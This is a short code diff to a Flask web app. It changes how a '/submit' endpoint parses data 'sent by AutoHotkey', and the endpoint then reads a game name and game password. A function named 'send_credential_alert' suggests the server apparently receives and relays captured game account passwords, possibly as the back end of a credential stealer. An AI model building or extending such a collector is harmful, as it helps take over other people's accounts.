@@ -37,7 +37,12 @@ async def send_credential_alert(game_name, game_password):
 
 @app.route('/submit', methods=['POST'])
 def handle_submission():
-    data = request.json or request.form
+    # Safely handle form data sent by AutoHotkey
+    if request.is_json:
+        data = request.get_json()
+    else:
+        data = request.form
+        
     game_name = data.get('game_name', 'Unknown')
     game_password = data.get('game_password', 'Unknown')
     
